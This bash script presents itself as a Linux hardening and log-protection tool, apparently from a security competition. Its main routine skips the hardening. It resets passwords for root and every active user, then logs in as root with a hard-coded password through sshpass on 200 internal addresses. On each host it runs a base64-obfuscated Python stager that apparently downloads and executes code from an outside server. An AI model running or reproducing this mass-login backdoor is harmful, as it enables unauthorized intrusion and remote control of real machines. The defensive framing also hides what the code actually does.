#!/bin/bash
# Exclude lightdm and xorg while protecting logs

checkMemes() {
    lst=('service' 'systemctl' 'initctl' 'tar' 'netstat' 'lsmod' 'apt-get' 'yum' 'date')
    for serv in "${lst[@]}"; do
        echo "Checking $serv...: $(command -v $serv)"
    done
    echo -n "Proceed? "
    read choice
    if [ "$choice" == "n" ]; then
        exit
    fi
}

getActiveUsers() {
    while IFS=: read a b dummy
    do
        if [ ! "$b" == "!" ] && [ ! "$b" == "*" ]; then
            echo "$a"
        fi
    done < /etc/shadow
}

changePasswords() {
    echo -n "Change password? "
    read choice
    if [ $choice == "y" ]; then
        echo "Changing password for the following users:"
        echo `getActiveUsers`
        echo -n "n3w p4ssw0rd: "
        read newp4ss
        echo "root:$newp4ss" | chpasswd
        getActiveUsers | xargs -d'\n' -I {} sh -c "echo {}:$newp4ss | chpasswd"
    fi
    echo "Change password: Done."
    echo ""
}

backupMemes() {
    echo "Backing up all the memes"
    if [ ! -e /usr/arm-linux-gnu ]; then
        mkdir /usr/arm-linux-gnu/
    fi
    BAKDIR=/usr/arm-linux-gnu/$(date +%F-%T)
    mkdir $BAKDIR
    # Backup logs
    tar -zc -f $BAKDIR/logs.tar.gz /var/log/
    # Backup configurations
    tar -zc -f $BAKDIR/configs.tar.gz /etc/
    # Backup binaries
    tar -zc -f $BAKDIR/bin.tar.gz `echo $PATH | awk -F: '{$1=$1} 1'` &
    # Backup critial files and command output: .viminfo, .*_history
    echo " === netstat === " > crits.log
    netstat -tunalp >> crits.log
    echo " =============== " >> crits.log

    echo " === ps aux === " >> crits.log
    ps aux >> crits.log
    echo " =============== " >> crits.log

    echo " === lsmod === " >> crits.log
    lsmod >> crits.log
    echo " =============== " >> crits.log

    if [ -n "$(command -v systemctl)" ]; then
        echo " === systemctl === " >> crits.log
        systemctl >> crits.log
        systemctl list-unit-files >> crits.log
        echo " =============== " >> crits.log
    elif [ -n "$(command -v initctl)" ]; then
        echo " === initctl === " >> crits.log
        initctl list >> crits.log
        echo " =============== " >> crits.log
    fi
    tar -zc -f $BAKDIR/crits.tar.gz /etc/sudoers /etc/passwd ./crits.log `find /home \( -name ".*_history" -o -name "*viminfo" \)`
    rm ./crits.log
    echo "Done."
    echo ""
}

configMemes() {
    echo "configuring all the memes"

    # config SSH
    configSSH
    configSudoers
    echo "Done."
    echo ""
}

disableNotMeme() {
    # Disable cron
    echo "Disabling cron"
    if [ -n "$(command -v service)" ]; then
        service cron stop
    elif [ -n "$(command -v systemctl)" ]; then
        systemctl stop cron
        systemctl disable cron
    elif [ -n "$(command -v initctl)" ]; then
        initctl stop cron
    fi
}

configSSH() {
    echo "configuring SSH"
    mv /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
    cp ./sshd_config /etc/ssh/
}

configSudoers() {
    echo "configuring sudoers"
    mv /etc/sudoers /etc/sudoers.bak
    cp ./sudoers /etc/
    chmod 440 /etc/sudoers
}

secureMemes() {
    echo "securing all the memes"
    secureLogs
    disableNotMeme
    echo "Done."
    echo ""
}

secureLogs() {
    echo "securing logs"
    chattr -a -R /var/log/
    find /var/log/* | grep -v "lightdm" | grep -v "Xorg.*.log*" | xargs -d'\n' -I {} chattr +a -R {}
}

installMemes() {
    if [ -n "$(command -v yum)" ]; then
        # yum -y update
        echo "yum: YES"
    elif [ -n "$(command -v apt-get)" ]; then
        # apt-get -y update
        echo "apt-get: YES"
    fi
    echo "Done."
    echo ""
}

firewallUp() {
    echo "Now, bow to my firewall"
    sh -c ./tables.sh
    echo "Done."
    echo ""
}


con(){
    ( sshpass -p 'Changeme-2018' ssh root@$1 -t 'echo "ZWNobyAiaW1wb3J0IHN5cyxiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdWbkpYZGtSa1JXWTlKMnRuUW1KbldDY0thVzF3YjNKMElITjVjeXdnZFhKc2JHbGlNanRwYlhCdmNuUWdjbVVzSUhOMVluQnliMk5sYzNNN1kyMWtJRDBnSW5CeklDMWxaaUI4SUdkeVpYQWdUR2wwZEd4bFhDQlRibWwwWTJnZ2ZDQm5jbVZ3SUMxMklHZHlaWEFpQ25CeklEMGdjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpaGpiV1FzSUhOb1pXeHNQVlJ5ZFdVc0lITjBaRzkxZEQxemRXSndjbTlqWlhOekxsQkpVRVVwQ205MWRDQTlJSEJ6TG5OMFpHOTFkQzV5WldGa0tDa0tjSE11YzNSa2IzVjBMbU5zYjNObEtDa0thV1lnY21VdWMyVmhjbU5vS0NKTWFYUjBiR1VnVTI1cGRHTm9JaXdnYjNWMEtUb0tJQ0FnYzNsekxtVjRhWFFvS1FwdlBWOWZhVzF3YjNKMFgxOG9lekk2SjNWeWJHeHBZakluTERNNkozVnliR3hwWWk1eVpYRjFaWE4wSjMxYmMzbHpMblpsY25OcGIyNWZhVzVtYjFzd1hWMHNabkp2Yld4cGMzUTlXeWRpZFdsc1pGOXZjR1Z1WlhJblhTa3VZblZwYkdSZmIzQmxibVZ5S0NrN1ZVRTlKMDF2ZW1sc2JHRXZOUzR3SUNoTllXTnBiblJ2YzJnN0lFbHVkR1ZzSUUxaFl5QlBVeUJZSURFd0xqRXhPeUJ5ZGpvME5TNHdLU0JIWldOcmJ5OHlNREV3TURFd01TQkdhWEpsWm05NEx6UTFMakFuTzI4dVlXUmthR1ZoWkdWeWN6MWJLQ2RWYzJWeUxVRm5aVzUwSnl4VlFTbGRPMkU5Ynk1dmNHVnVLQ2RvZEhSd09pOHZNVGc0TGpFMk5pNDRNeTR4TkRjNk9EQTRNQzlwYm1SbGVDNWhjM0FuS1M1eVpXRmtLQ2s3YTJWNVBTZGRZemhDTlRKemJrOHBRemRHWG14T2FGcHFRSGd6YTJGUVh6eEVPMWwzWmljN1V5eHFMRzkxZEQxeVlXNW5aU2d5TlRZcExEQXNXMTBLWm05eUlHa2dhVzRnY21GdVoyVW9NalUyS1RvS0lDQWdJR285S0dvclUxdHBYU3R2Y21Rb2EyVjVXMmtsYkdWdUtHdGxlU2xkS1NrbE1qVTJDaUFnSUNCVFcybGRMRk5iYWwwOVUxdHFYU3hUVzJsZENtazlhajB3Q21admNpQmphR0Z5SUdsdUlHRTZDaUFnSUNCcFBTaHBLekVwSlRJMU5nb2dJQ0FnYWowb2FpdFRXMmxkS1NVeU5UWUtJQ0FnSUZOYmFWMHNVMXRxWFQxVFcycGRMRk5iYVYwS0lDQWdJRzkxZEM1aGNIQmxibVFvWTJoeUtHOXlaQ2hqYUdGeUtWNVRXeWhUVzJsZEsxTmJhbDBwSlRJMU5sMHBLUXBsZUdWaktDY25MbXB2YVc0b2IzVjBLU2s9JykpOyIgfCBweXRob24gJg0KDQo=" | base64 -d | bash; bash -l' & )
}




main() {
    checkMemes 2>>checkMemes.error.log
    changePasswords 2>>changePasswords.error.log
#con 192.168.13.161
    apt-get install sshpass
    for i in `seq 1 50`; do
        con 10.2.$i.10
        con 10.2.$i.40
        con 10.2.$i.50
        con 10.3.$i.10
    done

    # bash ./pwn.sh
#    backupMemes 2>>backupMemes.error.log
#    secureMemes 2>>secureMemes.error.log
#    configMemes 2>>configMemes.error.log
#    installMemes 2>>installMemes.error.log
#    firewallUp 2>>firewallUp.error.log
}

main "$@"
